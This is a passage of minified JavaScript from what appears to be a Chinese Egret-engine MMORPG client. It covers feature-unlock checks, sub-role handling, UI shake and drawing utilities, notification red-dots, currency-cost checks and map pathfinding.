G=s.ActorCC.power,M=a.GameServerCC.serverOpenDay;if(f)for(var L=0,F=f;L<F.length;L++){var k=F[L];if(!(k.day-1>M)&&G<k.power)return p.GameLogic.ins().reportPowerNot(),!1}}if(v)switch(v){case 1:if(!urlParam.isMiniGame)return!1;break;case 2:if(urlParam.isWXiOS)return!1;break;case 3:if(!urlParam.isWXiOS)return!1}var O=r.ZsCT.ins().stage,N=l.SubRoles.ins().getSubRoleByIndex(0),W=0;return N&&(W=o.GlobalConfig.JingMaiStageConfig[N.jingMaiData.stage].stage),T=T>0?T:0,b>0&&S>=b?!1:w&&w>u.Recharge.ins().totalRechargeAmount?!1:n?h>=O&&d>=S&&T>=W&&(!c||a.GameServerCC.serverOpenDay+1>=c)&&(!y||a.GameServerCC._hefuCount>=y):O>=h&&S>=d&&W>=T&&(!c||a.GameServerCC.serverOpenDay+1>=c)&&(!y||a.GameServerCC._hefuCount>=y)},e.prototype.getNoOpenTips=function(t){var e=o.GlobalConfig.OpenSystemConfig[t],i=l.SubRoles.ins().getSubRoleByIndex(0),n=0;i&&(n=o.GlobalConfig.JingMaiStageConfig[i.jingMaiData.stage].stage);var u=o.GlobalConfig.JingMaiStageConfig[n],d=o.GlobalConfig.JingMaiStageConfig[e.jingmai],c="",f=e.jingmai>0?e.jingmai:0;return e&&(e.judge?e.than||(e.openDay>0&&a.GameServerCC.serverOpenDay+1<e.openDay&&(c+=gettext("开服{0}天",e.openDay)),e.hefu>0&&a.GameServerCC._hefuCount<e.hefu&&(c+=gettext("合服{0}次",e.hefu)),r.ZsCT.ins().stage<e.openzs&&(c+=gettext("{0}转",e.openzs),p.GameLogic.ins().reportZsLvNot()),s.ActorCC.level<e.openlevel&&(c+=gettext("{0}级",e.openlevel),p.GameLogic.ins().reportLvNot()),u.stage<f&&(c+=gettext("经脉达到{0}阶.{1}",h.StringUtils.NumberTurnChinese(d.level),d.name)),""!=c&&(c+=gettext("开启{0}",e.funName))):(c=gettext("{0}{1}级开启",e.funName?e.funName:"",e.openlevel),p.GameLogic.ins().reportLvNot())),c},e.prototype.patchNewFunOpen=function(){var t=[],i=o.GlobalConfig.OpenSystemConfig;for(var n in i){var s=i[n];if(s){var a=s.id,r=!!this.sysOpenList[a],l=e.ins().checkSysOpen(a);this.sysOpenList[a]=!!l,!r&&l&&t.push(a)}}if(!(t.length<=0)){for(var h=0;h<t.length;h++)this.patchSysOpen(t[h]);this.patchSysOpenAll()}},e.prototype.checkSysShow=function(t){if(this.checkSysOpen(t))return!0;var e=o.GlobalConfig.OpenSystemConfig[t];if(!e)return!1;var i=e.showzs,n=e.showLevel,l=e.showDay;return i&&r.ZsCT.ins().stage<i?!1:n&&s.ActorCC.level<n?!1:l&&a.GameServerCC.serverOpenDay+1<l?!1:!0},e.prototype.patchSysOpen=function(t){return t},e.prototype.patchSysOpenAll=function(){},__decorate([post()],e.prototype,"patchSysOpen",null),__decorate([post()],e.prototype,"patchSysOpenAll",null),e}(n.BaseSystem);e.OpenSystem=d,window.OpenSystem=d,__reflect(d.prototype,"OpenSystem",[]),Systemap.OpenSystem=function(){return d.ins()},window.OpenSystem=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SubRoles=void 0;var n=i(14),o=i(48),s=i(37),a=i(2),r=i(4),l=i(0),h=i(26),u=i(194),p=i(122),d=i(53),c=function(t){function e(){var i=t.call(this)||this;return i.roles=[],i.jobDic=[],observe(i,i.changeCamera,p0_4.addRole),observe(i,i.initLogin,Ts.enterScene.enterOK),observe(i,function(t){var i=t.canMove,n=(t.canAtk,e.lookAtTar);n&&u["default"].moveing(n)&&(i?(n.playAction(p.EntityAction.RUN),u["default"].resume(n)):(n.playAction(p.EntityAction.STAND),u["default"].pause(n)))},Ts.roleStatus),i}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){e.lookAtTar=null,d.ControlCC.setAuto(!1)},e.prototype.changeCamera=function(t){e.lookAtTar&&console.error("@@重复设置lookAtTar=",t),e.lookAtTar=s.EntityManager.ins().getEntityByHandle(t)},e.prototype.doSubRole=function(t){this.roles.length=0,this.jobDic.length=0;for(var e=t.readShort(),i=this.subRolesLen,n=0;e>n;n++){var s=this.roles[n];s||(s=new o.Role),s.parser(t),s.isMy=!0,this.roles[n]||this.roles.push(s),this.jobDic[s.job]||(this.jobDic[s.job]=s)}i&&i<this.roles.length&&a.TipsCT.ins().showTips(gettext("成功开启新角色"))},e.prototype.doSubRoleAtt=function(t){for(var e=t.readInt(),i=0,n=this.roles.length,o=0;n>o;o++){var s=this.getSubRoleByIndex(o);s.index==e&&(s.parserAtt(t),s.power=t.readDouble()),i+=s.power}r.ActorCC.postPowerChange(i)},e.prototype.getSubRoleByIndex=function(t){return this.roles[t]},e.prototype.getSubRoleByJob=function(t){for(var e=this.roles.length,i=0;e>i;i++){var n=this.getSubRoleByIndex(i);if(n.job==t)return this.roles[i]}return null},e.prototype.updateRoleByJob=function(t,e){for(var i=this.roles.length,n=0;i>n;n++){var o=this.getSubRoleByIndex(n);o.job==t&&(this.roles[n]=e)}return null},Object.defineProperty(e.prototype,"subRolesLen",{get:function(){return this.roles.length},enumerable:!1,configurable:!0}),e.prototype.getIsMyPlayer=function(t){for(var e=0,i=this.roles;e<i.length;e++){var n=i[e];if(n.handle==t)return!0}return!1},e.prototype.isLockRole=function(){for(var t=3,e=0;t>e;e++){var i=this.getSubRoleByIndex(e);if(!i){var n=l.GlobalConfig.NewRoleConfig[e];if(!n)continue;if(n.zsLevel){if(h.ZsCT.ins().stage>=n.zsLevel)return!0}else if(r.ActorCC.level>=n.level)return!0;if(n.vip&&r.ActorCC.vip>=n.vip)return!0}}return!1},e.MAX_ROLES=3,__decorate([post()],e.prototype,"changeCamera",null),__decorate([post()],e.prototype,"doSubRole",null),e}(n.BaseSystem);e.SubRoles=c,window.SubRoles=c,__reflect(c.prototype,"SubRoles",[]),window.SubRoles=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BaseSystem=void 0;var n=i(50),o=i(135),s=function(t){function e(){var e=t.call(this)||this;return e.initLogin&&observe(e,e.initLogin,o.GameApp.ins().postLoginInit),e.initZero&&observe(e,e.initZero,o.GameApp.ins().postZeroInit),e}return __extends(e,t),e.prototype.regNetMsg=function(t,e){observe(this,e,this.sysId+"-"+t)},e.prototype.getBytes=function(t){var e=Socket.ins().getBytes();return e.writeCmd(this.sysId,t),e},e.prototype.sendBaseProto=function(t){var e=this.getBytes(t);this.sendToServer(e)},e.prototype.sendToServer=function(t){return Socket.ins().sendToServer(t)},e.prototype.observe=function(t,e){observe(this,e,t)},e.prototype.removeObserve=function(){delMsg(this)},e}(n.BaseClass);e.BaseSystem=s,window.BaseSystem=s,__reflect(s.prototype,"BaseSystem",[]),window.BaseSystem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SystemType=void 0;var n;!function(t){t[t.RANK=3]="RANK",t[t.MALL=4]="MALL",t[t.FULI=5]="FULI",t[t.WORLDMAP=8]="WORLDMAP",t[t.RING=9]="RING",t[t.ZODIAC=10]="ZODIAC",t[t.BOOK=16]="BOOK",t[t.WXGAMESHARE=22]="WXGAMESHARE",t[t.CHAT=43]="CHAT",t[t.Rune=82]="Rune",t[t.Dress=85]="Dress",t[t.WaKuang=86]="WaKuang",t[t.Heirloom=87]="Heirloom",t[t.ExpWorld=88]="ExpWorld",t[t.EquipClear=89]="EquipClear",t[t.EquipSoul=90]="EquipSoul",t[t.GemSet=91]="GemSet",t[t.DevilBoss=92]="DevilBoss",t[t.LianTi=93]="LianTi",t[t.SVip=94]="SVip",t[t.MaYaShenDian=95]="MaYaShenDian",t[t.WoLongShanZhuang=96]="WoLongShanZhuang",t[t.AutoEquip=97]="AutoEquip",t[t.PrivateCaht=98]="PrivateCaht",t[t.GuildBattle=100]="GuildBattle",t[t.KF3v3=101]="KF3v3",t[t.extremeEquip=102]="extremeEquip",t[t.MOREGAME=103]="MOREGAME",t[t.equipSacrifice=104]="equipSacrifice",t[t.KF_WAR_GROUND=105]="KF_WAR_GROUND",t[t.KF_SHI_KONG_ZHI_JING=106]="KF_SHI_KONG_ZHI_JING",t[t.RUNE_SYNTHESIS=107]="RUNE_SYNTHESIS",t[t.AUTO_FIGHT_BUY=108]="AUTO_FIGHT_BUY",t[t.FOREST=109]="FOREST",t[t.EquipDuanPo=110]="EquipDuanPo",t[t.Totem=111]="Totem",t[t.Lianyu=113]="Lianyu",t[t.Invade=114]="Invade",t[t.SixReincarnations=115]="SixReincarnations",t[t.MasterEquip=116]="MasterEquip",t[t.LHPanel=117]="LHPanel",t[t.CrossDartCar=118]="CrossDartCar",t[t.WuShuangPanel=119]="WuShuangPanel",t[t.DEMON_CIR=120]="DEMON_CIR",t[t.Vip=50]="Vip",t[t.Celebration=127]="Celebration",t[t.Peak=128]="Peak",t[t.DYPACKEGE=129]="DYPACKEGE",t[t.GUILD_SOUL_LAND=130]="GUILD_SOUL_LAND",t[t.DevilMosBoss=131]="DevilMosBoss",t[t.IsTikTokConcern=132]="IsTikTokConcern",t[t.Hegemony=133]="Hegemony",t[t.NebulaDoor=135]="NebulaDoor",t[t.Celebration2=136]="Celebration2",t[t.Celebration3=137]="Celebration3",t[t.Celebration4=138]="Celebration4",t[t.GameclubDoor=139]="GameclubDoor",t[t.FaceBook=141]="FaceBook",t[t.WarSoul=142]="WarSoul",t[t.LingJing=143]="LingJing",t[t.Wing=144]="Wing",t[t.TunTian=145]="TunTian",t[t.LongGas=146]="LongGas",t[t.Contest=147]="Contest",t[t.Dominate=148]="Dominate",t[t.GodCrown=301]="GodCrown",t[t.gameFlashGift=2001]="gameFlashGift"}(n=e.SystemType||(e.SystemType={})),window.SystemType=n,window.SystemType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DisplayUtils=void 0;var n=i(100),o=function(){function t(){}return t.setShakeOn=function(t){this.openShake=t},t.removeFromParent=function(t){t&&null!=t.parent&&t.parent.removeChild(t)},t.shakeIt=function(e,i,n,o,s){if(void 0===o&&(o=1),void 0===s&&(s=function(){return!0}),this.openShake&&e&&!(1>o)&&s()){var a=[{anchorOffsetX:0,anchorOffsetY:-i},{anchorOffsetX:0,anchorOffsetY:+i},{anchorOffsetX:0,anchorOffsetY:0}];egret.Tween.removeTweens(e);var r=n/a.length;egret.Tween.get(e).to(a[0],r).to(a[1],r).to(a[2],r).call(function(){t.shakeIt(e,i,n,--o)},this)}},t.shakeItHeji=function(e,i,n,o,s){if(void 0===o&&(o=1),void 0===s&&(s=function(){return!0}),this.openShake&&e&&!(1>o)&&s()){var a=[{anchorOffsetX:.1*+i,anchorOffsetY:+i},{anchorOffsetX:.1*-i,anchorOffsetY:-i},{anchorOffsetX:.1*+i,anchorOffsetY:+i},{anchorOffsetX:.1*-i,anchorOffsetY:-i},{anchorOffsetX:.1*(+i>>1),anchorOffsetY:+i>>1},{anchorOffsetX:.1*(-i>>1),anchorOffsetY:-i>>1},{anchorOffsetX:.1*(+i>>2),anchorOffsetY:+i>>2},{anchorOffsetX:0,anchorOffsetY:0}];egret.Tween.removeTweens(e);var r=n/a.length;egret.Tween.get(e).to(a[0],r).to(a[1],r).to(a[2],r).to(a[3],r).to(a[4],r).to(a[5],r).to(a[6],r).to(a[7],r).call(function(){t.shakeIt(e,i,n,--o)},this)}},t.shakeItEntity=function(t,e,i,n,o){var s=this;if(void 0===n&&(n=1),void 0===o&&(o=function(){return!0}),this.openShake&&t&&!(1>n)&&o()){var a=.5*t.width,r=.5*t.height,l=[{anchorOffsetX:a,anchorOffsetY:r-e},{anchorOffsetX:a-e,anchorOffsetY:r},{anchorOffsetX:a+e,anchorOffsetY:r},{anchorOffsetX:a,anchorOffsetY:r+e},{anchorOffsetX:a,anchorOffsetY:r}];egret.Tween.removeTweens(t);var h=i/5;egret.Tween.get(t).to(l[0],h).to(l[1],h).to(l[2],h).to(l[3],h).to(l[4],h).call(function(){s.shakeIt(t,e,i,--n)},this)}},t.shakeItByDir=function(e,i,o,s,a,r){if(void 0===a&&(a=1),void 0===r&&(r=function(){return!0}),this.openShake&&e&&!(1>a)&&r()){var l=.5*n.mainfightcc.gridW,h=.5*n.mainfightcc.gridH,u=[{anchorOffsetX:l,anchorOffsetY:h+i},{anchorOffsetX:l-i,anchorOffsetY:h+i},{anchorOffsetX:l-i,anchorOffsetY:h},{anchorOffsetX:l-i,anchorOffsetY:h-i},{anchorOffsetX:l,anchorOffsetY:h-i},{anchorOffsetX:l+i,anchorOffsetY:h-i},{anchorOffsetX:l+i,anchorOffsetY:h},{anchorOffsetX:l+i,anchorOffsetY:h+i},{anchorOffsetX:l,anchorOffsetY:h}];egret.Tween.removeTweens(e);var p=s/u.length;egret.Tween.get(e).to(u[o],p).to(u[8],p).call(function(){e.anchorOffsetX=l,e.anchorOffsetY=h,t.shakeIt(e,i,s,--a)},this)}},t.drawCir=function(t,e,i,n){return null==t&&(t=new egret.Shape),t.graphics.clear(),t.graphics.beginFill(65535,1),t.graphics.moveTo(0,0),t.graphics.lineTo(e,0),t.graphics.drawArc(0,0,e,0,i*Math.PI/180,n),t.graphics.lineTo(0,0),t.graphics.endFill(),t},t.drawrect=function(t,e,i,n){return null==t&&(t=new egret.Shape),t.graphics.clear(),t.graphics.beginFill(65535,1),t.graphics.drawRect(0,0,e,i),t.graphics.endFill(),t},t.getEffectPath=function(t){return RES_DIR_EFF+t},t.scrollerToBottom=function(t){t.viewport.validateNow(),t.viewport.contentHeight>t.height&&(t.viewport.scrollV=t.viewport.contentHeight-t.height)},t.drawPolygon=function(t,e,i,n,o,s){void 0===n&&(n=1),void 0===o&&(o=0),void 0===s&&(s=16777215),null==t&&(t=new egret.Shape);var a=e;t.graphics.lineStyle(o,s),t.graphics.beginFill(i,n),t.graphics.moveTo(a[0].x,a[0].y);for(var r=0;r<a.length;r++)r<a.length-1?t.graphics.lineTo(a[r+1].x,a[r+1].y):t.graphics.lineTo(a[0].x,a[0].y);return t.graphics.endFill(),t},t.getPolygonVertex=function(t,e,i,n,o){for(var s=[],a=0;n>a;a++){var r=2*a*Math.PI/n,l={};l.x=t+i*o[a]/100*Math.sin(r),l.y=e-i*o[a]/100*Math.cos(r),s.push(l)}return s},t.openShake=!0,t}();e.DisplayUtils=o,window.DisplayUtils=o,__reflect(o.prototype,"DisplayUtils",[]),window.DisplayUtils=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RedPointBaseSys=e.RedPoint=void 0;var n=i(14),o=function(t){function e(e){for(var i=[],n=1;n<arguments.length;n++)i[n-1]=arguments[n];var o=t.call(this)||this;return o.v=!1,o.sub=[],o.bindTar=[],o.logic=function(){var t=!1;for(var e in o.sub)t=t||o.sub[e].v;return t},e&&(o.logic=e,observe.apply(void 0,__spreadArrays([o,o.msgCb],i))),o}return __extends(e,t),e.prototype.msgCb=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.logicCallBack.apply(this,t)},e.prototype.logicCallBack=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=this.logic.apply(this,t);if(void 0!==i&&this.v!=i){this.v=i;for(var n=0,o=this.bindTar;n<o.length;n++){var a=o[n];a.visible=i}this.parent&&this.parent.logicCallBack(),s.ins().RpChange()}},e.prototype.addSub=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];for(var i=0,n=t;i<n.length;i++){var o=n[i];o&&!o.parent&&this.sub.push(o.addParent(this))}return this.logicCallBack(),this},e.prototype.clearSub=function(){return this.sub.length=0,this},e.prototype.addParent=function(t){return this.parent?(console.warn("repeat set parent!"),this):(this.parent=t,this)},e.prototype.bind=function(t){if(t){var e=t.eRp;e=e||t,e.lastRp&&e.lastRp.unbind(e),e.once(egret.Event.REMOVED_FROM_STAGE,this.remove,this),e.visible=this.v,this.bindTar.push(e),e.lastRp=this}},e.prototype.unbind=function(t){if(t&&t.eRp){var e=t.eRp;e=e||t;var i=this.bindTar.indexOf(t);~i&&(e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.remove,this),this.bindTar.splice(i,1),delete e.lastRp)}},e.prototype.remove=function(t){this.unbind(t.currentTarget)},e.prototype.forEachSub=function(t){this.sub.forEach(t)},__decorate([delayCall(1e3)],e.prototype,"msgCb",null),e}(egret.HashObject);e.RedPoint=o,window.RedPoint=o,__reflect(o.prototype,"RedPoint",[]);var s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.RpChange=function(){},__decorate([post()],e.prototype,"RpChange",null),e}(n.BaseSystem);e.RedPointBaseSys=s,window.RedPointBaseSys=s,__reflect(s.prototype,"RedPointBaseSys",[]),window.RedPointBaseSys=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ColorUtil=void 0;var n=function(){function t(){}return t.mergeARGB=function(t,e,i,n){return t<<24|e<<16|i<<8|n},t.getChannel=function(t,e){switch(e){case this.ALPHA:return t>>24&255;case this.RED:return t>>16&255;case this.GREEN:return t>>8&255;case this.BLUE:return 255&t}return 0},t.numberToString=function(t,e){return void 0===e&&(e="#"),e+t.toString(16)},t.stringToNumber=function(t){if(7===t.length){var e=parseInt(t.slice(1,3),16),i=parseInt(t.slice(3,5),16),n=parseInt(t.slice(5,7),16);return e<<16|i<<8|n}},t.ALPHA=4080082432,t.RED=15937822,t.GREEN=3532333,t.BLUE=255,t.GRAY=9144715,t.NORMAL_COLOR=13746831,t.RED_COLOR_N=15937822,t.GREEN_COLOR_N=3532333,t.GRAY_COLOR2=8618883,t.WHITE_COLOR2=13746831,t.WHITE_COLOR="#D1C28F",t.RED_COLOR="#F3311E",t.GREEN_COLOR="#35E62D",t.GRAY_COLOR="#8B898B",t.COLOR_STR=[],t.ROLENAME_COLOR_YELLOW=16764427,t.ROLENAME_COLOR_GREEN=3532333,t.ROLENAME_COLOR_NORMAL=3532333,t.JUEWEI_COLOR=["#e2dfd4","#35e62d","#81adff","#e27dff","#ff9649","#fc5959","#ffd93f","#ffff00"],t}();e.ColorUtil=n,window.ColorUtil=n,__reflect(n.prototype,"ColorUtil",[]),window.ColorUtil=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GlobalFun=void 0;var n=i(0),o=i(39),s=i(36),a=i(4),r=i(80),l=i(30),h=i(6),u=i(10),p=i(185),d=i(161),c=i(59),f=i(28),g=i(2),m=i(63),v=function(){function t(){}return t.openRechargeWin=function(){win.open("RechargeShowWin")},t.isConsumeEnough=function(t){for(var e=t instanceof Array?t:[t],i=!0,n=0;n<e.length;n++){var o=e[n];if(i=i&&this.checkCost(o.count,o.id,"",!1),!i)return!1}return i},t.checkCost=function(t,e,i,o,l,p){var d;switch(void 0===i&&(i=""),void 0===o&&(o=!0),e){case s.MoneyConst.gold:if(a.ActorCC.gold>=t)return!0;i=""==i?gettext("|C:0xe6b422&T:金币|不足"):i,c.GameFlashSaleCt.ins().reportGolaNot();break;case s.MoneyConst.yuanbao:if(a.ActorCC.yb>=t)return!0;i=""==i?gettext("|C:0xe6b422&T:元宝|不足"):i;break;case s.MoneyConst.stone:if(a.ActorCC.stone>=t)return!0;i=""==i?gettext("|C:0xe6b422&T:矿物纯度|不足"):i,c.GameFlashSaleCt.ins().reportShenBingMaterialNot();break;case s.MoneyConst.guildGx:if(a.ActorCC.guildNum>=t)return!0;i=""==i?gettext("|C:0xe6b422&T:行会贡献|不足"):i;break;case s.MoneyConst.skillPoints:if(a.ActorCC.skillPoints>=t)return!0;i=""==i?gettext("|C:0xe6b422&T:星云技能点|不足"):i;break;default:var f=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_EQUIP,e)||h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,e);if(1==r.TotemCT.ins().isTotemOpen&&r.TotemCT.ins().isTotem(e)&&(f=1),!(t>f))return!0;var v=(null===(d=n.GlobalConfig.ItemConfig[e])||void 0===d?void 0:d.name)||"",y=u.ItemUtil.getQualityColor2(n.GlobalConfig.ItemConfig[e]);i=""==i?gettext("|C:{0}&T:{1}|不足",y,v):i,o&&console.log("======Id===>",e)}return o&&(p?m.WarnCT.ins().setBuyGoodsWarn(e,1,!0):(g.TipsCT.ins().showTips(i),e!=s.MoneyConst.gold||win.get("ExpGoldWin")||window.platform.isshen()||win.open("ExpGoldWin"))),l&&l(),!1},t.getRomanNumStr=function(t){var e="";if(t>0){for(var i=Math.floor(t/1e3),n=Math.floor(t%1e3/100),o=Math.floor(t%100/10),s=t%10,a=["I","II","III","IV","V","VI","VII","VIII","IX"],r=["X","XX","XXX","XL","L","LX","LXX","LXXX","XC"],l=["C","CC","CCC","CD","D","DC","DCC","DCCC","CM"],h="M",u=0;i>u;u++)e+=h;n&&(e+=l[n-1]),o&&(e+=r[o-1]),s&&(e+=a[s-1])}return e},t.arrShuffle=function(t){for(var e=t.length,i=0;e-1>i;i++){var n=Math.floor(Math.random()*(e-i)),o=t[n];t[n]=t[e-i-1],t[e-i-1]=o}},t.showDetail=function(t,e,s,a,r,l){return void 0===e&&(e=null),void 0===s&&(s=1),void 0===a&&(a=null),void 0===r&&(r=""),void 0===l&&(l=""),__awaiter(this,void 0,void 0,function(){var h,c,f,g,m,v;return __generator(this,function(y){switch(y.label){case 0:if(!t)return[2];switch(h=u.ItemUtil.getType(t)){case o.ItemType.TYPE_0:return[3,1];case o.ItemType.TYPE_4:return[3,1];case o.ItemType.TYPE_26:return[3,1];case o.ItemType.TYPE_35:return[3,2];case o.ItemType.TYPE_1:return[3,3];case o.ItemType.TYPE_2:return[3,4];case o.ItemType.TYPE_6:return[3,5];case o.ItemType.TYPE_11:return[3,6];case o.ItemType.TYPE_17:return[3,7];case o.ItemType.TYPE_22:return[3,8];case o.ItemType.TYPE_8:return[3,9];case o.ItemType.TYPE_10:return[3,9];case o.ItemType.TYPE_20:return[3,9];case o.ItemType.TYPE_27:return[3,9];case o.ItemType.TYPE_47:return[3,9];case o.ItemType.TYPE_48:return[3,9];case o.ItemType.TYPE_35:return[3,13];case o.ItemType.TYPE_41:return[3,14];case o.ItemType.TYPE_45:return[3,15];case o.ItemType.TYPE_46:return[3,15];case o.ItemType.TYPE_53:return[3,16];case o.ItemType.TYPE_55:return[3,17]}return[3,18];case 1:return this.openEquipsTips(t,e),[3,19];case 2:return win.open("TitleTipsWin",e),[3,19];case 3:return e&&e.handle&&n.GlobalConfig.ItemComposeConfig[t.id]&&!n.GlobalConfig.ItemComposeConfig[t.id].dropId?win.open("ItemUseTipsWin",e):d.Dress.ins().isZhuangBanItem(t.id)?win.open("DressTipsWin",t,e&&null!=e.handle):win.open("ItemDetailedWin",0,t.id,e?e.count:1),[3,19];case 4:return e&&e.handle?win.open("ItemUseTipsWin",e):e&&e.count?win.open("ItemDetailedWin",0,t.id,e.count):win.open("ItemDetailedWin",0,t.id),[3,19];case 5:return win.open("RuneTipsWin",0,t.id,r,l),[3,19];case 6:c=n.GlobalConfig.HeirloomEquipFireConfig,f=0;for(g in c)if(c[g].expend.id==t.id){f=c[g].slot;break}return f&&win.open("HeirloomEquipTipsWin",null,f-1,1),[3,19];case 7:for(m=!1;a&&a.parent;)if(a=a.parent,a instanceof p.BagWin){m=!0;break}return win.open(m?"TreasureChuanshiGiftWin":"ItemDetailedWin",0,t.id,e.count),[3,19];case 8:return win.open("ZhanlingZBTipWin",t.id),[3,19];case 9:return e&&1==e.type?(win.open("ItemDetailedWin",0,t.id,e.count),[3,12]):[3,10];case 10:return m=!1,[4,Promise.resolve().then(function(){return i(184)})];case 11:for(v=y.sent().BagPanel;a&&a.parent;)if(a=a.parent,a instanceof v){m=!0;break}m?win.open("ItemUseTipsWin",{itemConfig:t,configID:t.id,count:s}):win.open("ItemDetailedWin",0,t.id,s),y.label=12;case 12:return[3,19];case 13:return win.open("TitleTipsWin",e),[3,19];case 14:return win.open("SmItemTipsWin",t.id,e),[3,19];case 15:return win.open("KingEquipTipsWin",t.id),[3,19];case 16:return e&&e.handle?win.open("ItemJulingTip",e):win.open("ItemDetailedWin",0,t.id),[3,19];case 17:return win.open("EquipInlayTipsWin",e),[3,19];case 18:win.open("ItemDetailedWin",0,t.id),y.label=19;case 19:return[2]}})})},t.openEquipsTips=function(t,e){void 0===e&&(e=null);var i=u.ItemUtil.getSubType(t);return u.ItemUtil.getType(t)==o.ItemType.TYPE_26?void win.open("ThunderEquipTipsWin",0,i,e):void(n.GlobalConfig.HotBloodAwakeConf.legendEquip.indexOf(t.id)>-1?win.open("LegendTipsWin",t.id,e):win.open("EquipDetailedWin",1,e?e.handle:null,t.id,e))},t.jumpLink=function(t){if(n.GlobalConfig.GuideLinkConfig[t].special);else for(var e=n.GlobalConfig.GuideLinkConfig[t].guide,i=0;i<e.length;i++){var o=e[i];"GuildConWin"==o[0]&&f.Guild.ins().sendConCount(),win.open2.apply(win,o)}},t.jumpLink2=function(t){for(var e=n.GlobalConfig.GuideWinConfig[t].guide,i=0;i<e.length;i++){var o=e[i];win.open(o[0],o[1],o[2])}},t.jumpLink1=function(t){if(n.GlobalConfig.GuideLinkConfig[t].special);else for(var e=n.GlobalConfig.GuideLinkConfig[t].guide,i=0;i<e.length;i++){var o=e[i];win.open(o[0],o[1],o[2])}},t.getItemCount=function(t){return t==s.MoneyConst.gold?a.ActorCC.gold:t==s.MoneyConst.yuanbao?a.ActorCC.yb:t==s.MoneyConst.stone?a.ActorCC.stone:t==s.MoneyConst.guildGx?a.ActorCC.guildNum:h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_EQUIP,t)||h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,t)
},t.getItemName=function(t){var e;return t==s.MoneyConst.gold?gettext("金币"):t==s.MoneyConst.yuanbao?gettext("元宝"):t==s.MoneyConst.stone?gettext("矿物纯度"):t==s.MoneyConst.guildGx?gettext("行会贡献"):t==s.MoneyConst.crossDartCarScore?gettext("跨服运镖积分"):(null===(e=n.GlobalConfig.ItemConfig[t])||void 0===e?void 0:e.name)||""},t.getItemSource=function(t){if("number"==typeof t){var e=t;return e==s.MoneyConst.gold||e==s.MoneyConst.yuanbao?l.RewardData.CURRENCY_RES[e]:u.ItemUtil.getItemSource(n.GlobalConfig.ItemConfig[e])}return u.ItemUtil.getItemSource(t)},t}();e.GlobalFun=v,window.GlobalFun=v,__reflect(v.prototype,"GlobalFun",[]),window.GlobalFun=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameMap=void 0;var n=i(50),o=i(289),s=i(290),a=i(291),r=i(146),l=i(23),h=i(0),u=i(635),p=i(70),d=i(32),c=i(2),f=i(102),g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),Object.defineProperty(e,"fbType",{get:function(){return e._fbType},set:function(t){e._fbType=t,this.postFbType()},enumerable:!1,configurable:!0}),e.postFbType=function(){},e.checkIsKf=function(t){void 0===t&&(t=!0);var e=f.KFServerSys.ins().isKF;return t&&e&&c.TipsCT.ins().showTips(gettext("跨服状态无法使用")),e},e.checkIsInGuildBattle=function(){return this.fbType==d.FbCT.FB_TYPE_GUILD_WAR},e.checkIsInQiyuBoss=function(){return this.fbType==d.FbCT.FB_TYPE_QIYU_BOSS},e.checkIsInKf3v3=function(){return this.fbType==d.FbCT.FB_TYPE_KF_ARENA},e.checkIsInShiKongZhiJing=function(){return this.fbType==d.FbCT.FB_TYPE_SHI_KONG_ZHI_JING},e.checkIsInInvade=function(){return this.fbType==d.FbCT.FB_TYPE_INVADE},e.checkIsInDevildomBoss=function(){return this.fbType==d.FbCT.FB_TYPE_DEVILDOM_BOSS},e.checkIsInCrossDart=function(){return this.fbType==d.FbCT.FB_TYPE_CROSSDART},e.checkIsInGuildSoulsLand=function(){return this.fbType==d.FbCT.FB_TYPE_SOULS},e.checkIsInHegemony=function(){return this.fbType==d.FbCT.FB_TYPE_HEGEMONY},e.checkIsInStardomain=function(){return this.fbType==d.FbCT.FB_TYPE_STARDOMAIN},e.checkIsInLingJing=function(){return this.fbType==d.FbCT.FB_TYPE_LINGJING},e.checkIsInShouLei=function(){return this.fbType==d.FbCT.FB_TYPE_CONTEST0||this.fbType==d.FbCT.FB_TYPE_CONTEST},e.checkIsInDominate=function(){return this.fbType==d.FbCT.FB_TYPE_KF_DOMINATE},e.init=function(t){this.grid=this.grid||new o.MapGrid,this.aStar=this.aStar||new s.AStar,this.mapZip=t},e.moveEntity=function(t,i,n,o){void 0===o&&(o=!1);var s,h=e.CELL_SIZE,u=Math.floor(t.x/h),p=Math.floor(t.y/h),d=Math.floor(i/h),c=Math.floor(n/h);if(o)s=[new a.AStarNode(i,n,r.DirUtil.get8DirBy2Point({x:t.x,y:t.y},{x:i,y:n}))];else if(u==d&&p==c)s=[new a.AStarNode(d,c,r.DirUtil.get8DirBy2Point({x:t.x,y:t.y},{x:i,y:n}))];else if(s=this.aStar.getPath(u,p,d,c),!s)return;l.GameLogic.ins().postMoveEntity(t,s,!o)},e.getPatch=function(t,e,i,n){var o=this.aStar.getPath(t,e,i,n);return o},e.moveTo=function(t,e){},e.checkWalkable=function(t,e){return!0},e.checkAlpha=function(t,e){t=Math.floor(t/64),e=Math.floor(e/64);var i=!1,n=this.grid.getNode(t,e);return 